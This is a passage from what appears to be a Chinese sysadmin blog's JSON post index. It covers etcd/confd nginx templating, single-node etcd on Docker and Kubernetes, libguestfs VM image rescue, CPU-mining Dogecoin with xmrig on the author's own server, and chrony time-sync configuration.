class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{{range getvs \u0026#34;/nginx/app01/upstream/*\u0026#34;}}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    server {{.}};\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{{end}}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eserver {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    server_name  {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}.example.com;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    location / {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_pass        http://{{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}};\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_redirect    off;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  Host             $host;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  X-Real-IP        $remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003econfd 会根据 etcd 的值，结合 nginx.conf.tmpl ，生成 nginx-auto.conf，然后 nginx -t 验证通过后，执行 nginx -s rolad。\u003c/p\u003e","title":"ETCD + CONFD + NGINX的配置"},{"content":"由于使用到了阿里的 K8S 托管集群 ACK，于是想占便宜。想用到托管 master node 的 etcd 来保存数据。\n结果是，未遂！！无法使用。\n阿里有单独的配置管理服务，复杂化了，不想用。\n那么解决方案就是，启动只有一个节点副本的 etcd pod，然后数据持久化到 OSS 的 S3 桶中。\n一、实现etcd的单节点docker化 首先我们只想在测试环境中跑一个单节点的 etcd，还没有用到 k8s，做法如下：\n#!/bin/bash NODE1=172.18.31.33 REGISTRY=quay.io/coreos/etcd # available from v3.2.5 #REGISTRY=gcr.io/etcd-development/etcd docker run \\ -p 2379:2379 \\ -p 2380:2380 \\ --volume=/data/etcd:/etcd-data \\ --name etcd ${REGISTRY}:latest \\ /usr/local/bin/etcd \\ --data-dir=/etcd-data --name node1 \\ --initial-advertise-peer-urls http://${NODE1}:2380 --listen-peer-urls http://0.0.0.0:2380 \\ --advertise-client-urls http://${NODE1}:2379 --listen-client-urls http://0.0.0.0:2379 \\ --initial-cluster node1=http://${NODE1}:2380 如上就可以了，容器跑起来以后进入容器测试一下：\ndocker exec -it 425f26903466 /bin/sh etcdctl -C http://127.0.0.1:2379 member list c3511611548b7c7c: name=node1 peerURLs=http://172.18.31.33:2380 clientURLs=http://172.18.31.33:2379 isLeader=true etcdctl ls --recursive / 这样一个单节点的 etcd 就弄好了，对外暴露的是 2379 和 2380 端口\n二、实现 etcd 的单节点 k8s 化 首先编写一个deployment文件etcd-deploy.yaml：\n下载：etcd-deploy.yaml\napiVersion: apps/v1 kind: Deployment metadata: name: etcd-deploy labels: app: etcd spec: replicas: 1 selector: matchLabels: app: etcd template: metadata: labels: app: etcd spec: containers: - name: etcd image: quay.io/coreos/etcd:latest ports: - containerPort: 2379 name: client protocol: TCP - containerPort: 2380 name: server protocol: TCP command: - /usr/local/bin/etcd - --name - etcd - --initial-advertise-peer-urls - http://etcd:2380 - --listen-peer-urls - http://0.0.0.0:2380 - --listen-client-urls - http://0.0.0.0:2379 - --advertise-client-urls - http://etcd:2379 - --initial-cluster - etcd=http://etcd:2380 - --data-dir - /etcd-data volumeMounts: - mountPath: /etcd-data name: etcd-data lifecycle: postStart: exec: command: - \u0026#34;sh\u0026#34; - \u0026#34;-c\u0026#34; - \u0026gt; echo \u0026#34;127.0.0.1 etcd\u0026#34; \u0026gt;\u0026gt; /etc/hosts; volumes: - name: etcd-data persistentVolumeClaim: claimName: k8s-etcd-20g restartPolicy: Always 注意上面，我们使用了一个 pvc 卷 k8s-etcd-20g，这个卷挂在 /etcd-data，是由 OSS 建立的，用于持久话数据，省得重启 etcd 的 pod，数据消失不见了。\n然后，我们需要把这个 deployment 作为 svc 服务暴露在集群中，再编写一个etcd-svc.yaml\n下载：etcd-svc.yaml\napiVersion: v1 kind: Service metadata: name: etcd-svc spec: ports: - port: 2379 name: tcp2379 protocol: TCP targetPort: 2379 - port: 2380 name: tcp2380 protocol: TCP targetPort: 2380 selector: app: etcd type: ClusterIP kubectl apply 部署到 k8s 中，这样就可以了。\nk8s测试方法，随便启动一个 busybox pod，进去测试一下：\nkubectl run curl --image=radial/busyboxplus:curl -i --tty --rm curl http://etcd-svc:2379/version curl http://etcd-svc.default:2379/version curl http://etcd-svc.default:2379/v2/keys curl http://etcd-svc.default:2379/v2/keys/?recursive=true curl http://etcd-svc.default:2379/v2/keys/service/nginx curl http://etcd-svc.default:2379/v2/keys/service/nginx/127.0.0.1 curl --location --request PUT \u0026#39;http://etcd-svc:2379/v2/keys/service/nginx/10.240.0.41\u0026#39; --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data-urlencode \u0026#39;value=10.240.0.41:9000\u0026#39; curl http://etcd-svc.default:2379/v2/keys/service/nginx/ ","permalink":"https://rendoumi.com/posts/20211021-etcd_docker/","summary":"\u003cp\u003e由于使用到了阿里的 K8S 托管集群 ACK，于是想占便宜。想用到托管 master node 的 etcd 来保存数据。\u003c/p\u003e\n\u003cp\u003e结果是，未遂！！无法使用。\u003c/p\u003e\n\u003cp\u003e阿里有单独的配置管理服务，复杂化了，不想用。\u003c/p\u003e\n\u003cp\u003e那么解决方案就是，启动只有一个节点副本的 etcd pod，然后数据持久化到 OSS 的 S3 桶中。\u003c/p\u003e\n\u003ch2 id=\"一实现etcd的单节点docker化\"\u003e一、实现etcd的单节点docker化\u003c/h2\u003e\n\u003cp\u003e首先我们只想在测试环境中跑一个单节点的 etcd，还没有用到 k8s，做法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.33\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eREGISTRY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003equay.io/coreos/etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# available from v3.2.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#REGISTRY=gcr.io/etcd-development/etcd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 2379:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 2380:2380 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --volume\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/etcd:/etcd-data \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name etcd \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eREGISTRY\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:latest \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  /usr/local/bin/etcd \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --data-dir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etcd-data --name node1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --initial-advertise-peer-urls http://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2380 --listen-peer-urls http://0.0.0.0:2380 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --advertise-client-urls http://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2379 --listen-client-urls http://0.0.0.0:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --initial-cluster \u003cspan class=\"nv\"\u003enode1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNODE1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:2380\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如上就可以了，容器跑起来以后进入容器测试一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it 425f26903466 /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eetcdctl -C http://127.0.0.1:2379 member list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ec3511611548b7c7c: \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enode1 \u003cspan class=\"nv\"\u003epeerURLs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.18.31.33:2380 \u003cspan class=\"nv\"\u003eclientURLs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.18.31.33:2379 \u003cspan class=\"nv\"\u003eisLeader\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eetcdctl ls --recursive /\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样一个单节点的 etcd 就弄好了，对外暴露的是 2379 和 2380 端口\u003c/p\u003e","title":"etcd单节点应用"},{"content":"在生产环境中我们大量使用了 kvm 的虚拟技术，虚拟机的镜像系统使用的是 Cloud-init 的技术\n不可避免的，虚机会遭到各种损坏，维护的手段就十分必要了\n假设我们有一个虚机文件 vis-16-41-18.qcow2 坏了\n一、安装支持包 yum install libguestfs libguestfs-tools 二、查看日志 virt-log -a vis-16-41-18.qcow2 没有什么特殊的报错信息\n三、分析文件系统组成 virt-filesystems和virt-df都可以，用virt-df看的更多一些\nvirt-filesystems -l -a vis-16-41-18.qcow2 Name Type VFS Label Size Parent /dev/sda1 filesystem ext4 - 209715200 - /dev/sda2 filesystem ext4 - 214536355840 - virt-df -a vis-16-41-18.qcow2 Filesystem 1K-blocks Used Available Use% vis-16-41-18.qcow2:/dev/sda1 194241 31706 152295 17% vis-16-41-18.qcow2:/dev/sda2 206088704 5639856 189973444 3% 四、挂载文件系统开始修复（方法1） 从上面可以看到 vis-16-41-18.qcow2 里面有两个分区，/dev/sda1 和/dev/sda2\n第一个应该是/boot，第二个是/\n把 / mount 出来\nmkdir 18 guestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18 或者全自动mount\nguestmount -a vis-16-41-18.qcow2 -i --rw ./18 这样就可以直接进18目录进行修复操作了\ncd 18/lib64 ls libc*.* 发现同事胡乱升级glibc，把libc的基础库弄坏了，少libc.so.6的软链接，建立一个修复即可\nln -s libc-2.15.so libc.so.6 五、挂载文件系统开始修复（方法2） 我们可以用 guestmount，也可以直接用 guestfish 。\nguestfish 是个命令行工具。它使用 libguestfs 的所有功能。\nguestfish Welcome to guestfish, the libguestfs filesystem interactive shell for editing virtual machine filesystems. Type: \u0026#39;help\u0026#39; for help on commands \u0026#39;man\u0026#39; to read the manual \u0026#39;quit\u0026#39; to quit the shell \u0026gt;\u0026lt;fs\u0026gt; add vis-16-41-18.qcow2 \u0026gt;\u0026lt;fs\u0026gt; run \u0026gt;\u0026lt;fs\u0026gt; list-filesystems /dev/sda1: ext4 /dev/sda2: ext4 \u0026gt;\u0026lt;fs\u0026gt; mount /dev/sda2 / \u0026gt;\u0026lt;fs\u0026gt; cat /etc/fstab # # /etc/fstab # Created by anaconda on Mon Dec 29 15:24:53 2014 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # UUID=9fdc111c-3042-4527-b3f8-a2961e55077e / ext4 defaults 1 1 UUID=1855d5e1-18f8-48ea-8c3b-c52cdd512a5e /boot ext4 defaults 1 2 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 \u0026gt;\u0026lt;fs\u0026gt; guestfish的常用命令：\nadd vis-16-41-18.qcow2 run list-filesystems ll / ls / cat /etc/fstab write-append /etc/rc.d/rc.local \u0026#34;service sshd start\u0026#34; edit /etc/fstab. less /var/log/messages mkdir /tmp/a touch /tmp/a/b.txt write /tmp/a/b.txt rm /tmp/a/b.txt upload Upload a local file to the disk. ###注意：是上载本地文件到镜像文件去！！！ 六、virt对应guestfish的一些命令 virt-cat vis-16-41-18.qcow2 /home/supdev/.bash_history virt-copy-in Copy files and directories into a guest. virt-copy-out Copy files and directories out of a guest. virt-edit Edit a file in a guest. virt-ls List files and directories in a guest 七、virt-rescue救援模式 如果虚机系统起不来，可以先尝试进入 rescue 救援模式\nvirt-rescue 类似于救援 CD，但用于虚拟机，且无需提供 CD。\nvirt-rescue 为用户提供救援外壳和一些简单的恢复工具，可用于检查和更正虚拟机或磁盘映像中的问题。\nvirt-rescue -a vis-16-41-18.qcow2 Welcome to virt-rescue, the libguestfs rescue shell. Note: The contents of / are the rescue appliance. You need to mount the guest\u0026#39;s partitions under /sysroot before you can examine them. A helper script for that exists: mount-rootfs-and-do-chroot.sh /dev/sda2 \u0026gt;\u0026lt;rescue\u0026gt; [ 67.194384] EXT4-fs (sda1): mounting ext3 file system using the ext4 subsystem [ 67.199292] EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: (null) mount: /dev/sda1 mounted on /sysroot. mount: /dev bound on /sysroot/dev. mount: /dev/pts bound on /sysroot/dev/pts. mount: /proc bound on /sysroot/proc. mount: /sys bound on /sysroot/sys. Directory: /root Thu Jun 5 13:20:51 UTC 2014 (none):~ # ","permalink":"https://rendoumi.com/posts/20211021-libguestfs/","summary":"\u003cp\u003e在生产环境中我们大量使用了 kvm 的虚拟技术，虚拟机的镜像系统使用的是 Cloud-init 的技术\u003c/p\u003e\n\u003cp\u003e不可避免的，虚机会遭到各种损坏，维护的手段就十分必要了\u003c/p\u003e\n\u003cp\u003e假设我们有一个虚机文件 vis-16-41-18.qcow2 坏了\u003c/p\u003e\n\u003ch2 id=\"一安装支持包\"\u003e一、安装支持包\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install libguestfs libguestfs-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二查看日志\"\u003e二、查看日志\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-log -a vis-16-41-18.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211021-libguestfs/image-20211021115044742.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没有什么特殊的报错信息\u003c/p\u003e\n\u003ch2 id=\"三分析文件系统组成\"\u003e三、分析文件系统组成\u003c/h2\u003e\n\u003cp\u003evirt-filesystems和virt-df都可以，用virt-df看的更多一些\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-filesystems -l -a vis-16-41-18.qcow2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName       Type        VFS   Label  Size          Parent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1  filesystem  ext4  -      \u003cspan class=\"m\"\u003e209715200\u003c/span\u003e     -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2  filesystem  ext4  -      \u003cspan class=\"m\"\u003e214536355840\u003c/span\u003e  -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-df -a vis-16-41-18.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFilesystem                           1K-blocks       Used  Available  Use%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evis-16-41-18.qcow2:/dev/sda1            \u003cspan class=\"m\"\u003e194241\u003c/span\u003e      \u003cspan class=\"m\"\u003e31706\u003c/span\u003e     \u003cspan class=\"m\"\u003e152295\u003c/span\u003e   17%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evis-16-41-18.qcow2:/dev/sda2         \u003cspan class=\"m\"\u003e206088704\u003c/span\u003e    \u003cspan class=\"m\"\u003e5639856\u003c/span\u003e  \u003cspan class=\"m\"\u003e189973444\u003c/span\u003e    3%\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"四挂载文件系统开始修复方法1\"\u003e四、挂载文件系统开始修复（方法1）\u003c/h2\u003e\n\u003cp\u003e从上面可以看到 vis-16-41-18.qcow2 里面有两个分区，/dev/sda1 和/dev/sda2\u003c/p\u003e\n\u003cp\u003e第一个应该是/boot，第二个是/\u003c/p\u003e\n\u003cp\u003e把 / mount 出来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir \u003cspan class=\"m\"\u003e18\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eguestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e或者全自动mount\u003c/p\u003e","title":"Libguestfs的救援手段"},{"content":"这是个娱乐话题，Dogecoin 狗币在马斯克的吹捧鼓动下，冲上云霄\n其实真的用CPU挖币，应该是挖 xmb 门罗币才是对的选择，挖狗币只是娱乐一下\n废话不多说，直接放上教程，我的机器是 CentoOS\n首先需要有个狗币钱包地址，这个我就不教大家了\n一、下载xmrig挖矿软件 下载地址：https://github.com/xmrig/xmrig/releases\n我们选择最近的下载就好\n二、做好加密通道 我们需要做好一条加密tcp通道\n用 ghostunnel, localhost:9999 \u0026mdash;\u0026gt; vps:9999 \u0026mdash;\u0026gt; rx.unmineable.com:3333\n三、用screen后台开挖 screen #./xmrig -o localhost:9999 -a rx -k -u DOGE:狗币地址.矿工名#heyt-3711 ./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01 ctrl+a+d 四、查看挖了多少 查看地址：https://unmineable.com/coins/DOGE/address/\n","permalink":"https://rendoumi.com/posts/20211021-dogecoin/","summary":"\u003cp\u003e这是个娱乐话题，Dogecoin 狗币在马斯克的吹捧鼓动下，冲上云霄\u003c/p\u003e\n\u003cp\u003e其实真的用CPU挖币，应该是挖 xmb 门罗币才是对的选择，挖狗币只是娱乐一下\u003c/p\u003e\n\u003cp\u003e废话不多说，直接放上教程，我的机器是 CentoOS\u003c/p\u003e\n\u003cp\u003e首先需要有个狗币钱包地址，这个我就不教大家了\u003c/p\u003e\n\u003ch2 id=\"一下载xmrig挖矿软件\"\u003e一、下载xmrig挖矿软件\u003c/h2\u003e\n\u003cp\u003e下载地址：https://github.com/xmrig/xmrig/releases\u003c/p\u003e\n\u003cp\u003e我们选择最近的下载就好\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021101957637.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"二做好加密通道\"\u003e二、做好加密通道\u003c/h2\u003e\n\u003cp\u003e我们需要做好一条加密tcp通道\u003c/p\u003e\n\u003cp\u003e用 ghostunnel,    localhost:9999 \u0026mdash;\u0026gt; vps:9999 \u0026mdash;\u0026gt; rx.unmineable.com:3333\u003c/p\u003e\n\u003ch2 id=\"三用screen后台开挖\"\u003e三、用screen后台开挖\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./xmrig -o localhost:9999 -a rx -k -u DOGE:狗币地址.矿工名#heyt-3711\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211021102338089\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021102338089.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"四查看挖了多少\"\u003e四、查看挖了多少\u003c/h2\u003e\n\u003cp\u003e查看地址：https://unmineable.com/coins/DOGE/address/\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211021102710484\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021102710484.png\"\u003e\u003c/p\u003e","title":"如何用CPU挖狗币Dogecoin"},{"content":"chrony 已经成了事实标准，替代了ntp。\n但是，有几个细节，需要非常注意。\n给出我们的配置，/etc/chrony.conf\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 172.10.1.1 iburst prefer minpoll 6 maxpoll 10 server 172.10.1.2 iburst # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Allow the system clock to be stepped in the first three updates # if its offset is larger than 1 second. makestep 1.0 3 # Enable kernel synchronization of the real-time clock (RTC). rtcsync # Enable hardware timestamping on all interfaces that support it. #hwtimestamp * # Increase the minimum number of selectable sources required to adjust # the system clock. #minsources 2 # Allow NTP client access from local network. #allow 192.168.0.0/16 # Serve time even if not synchronized to a time source. #local stratum 10 # Specify file containing keys for NTP authentication. #keyfile /etc/chrony.keys # Specify directory for log files. logdir /var/log/chrony logchange 0.5 # Select which information is logged. #log measurements statistics tracking rtc 里面有好几个细节，下面逐一解释一下：\n一、server 这里可以添加很多时间服务器，172.10.1.1 和 172.10.1.2 是两台自建的时间服务器。\nibust 会在 chrony 启动的2秒内，去快速poll服务器4次来快速矫正当前系统时间\nprefer 优先使用指定的服务器\nminpoll 6，缺省是6，意思是2的6次方，也就是64秒，最小轮询时间服务器的时间间隔是64秒\nmaxpoll 10，缺省是10，同上，2的10次方，也就是1024秒，最大轮询时间间隔是1024秒\n通常情况下一过minpoll的时间周期，就会触发一次时间同步询问。\n二、makestep 正常情况下如果系统时钟跟时间服务器不一致，chrony调整的方式是慢慢增加，或慢慢减少，不会一步到位，直接去跟时间服务器对齐。\nmakestep 1.0 3，意思就是如果时间服务器跟系统时间相差1秒，那么就在下3个时钟更新中追上时间服务器。\n这样就会立刻快速追平了，这样会带来时间跳跃。\n三、rtcsync 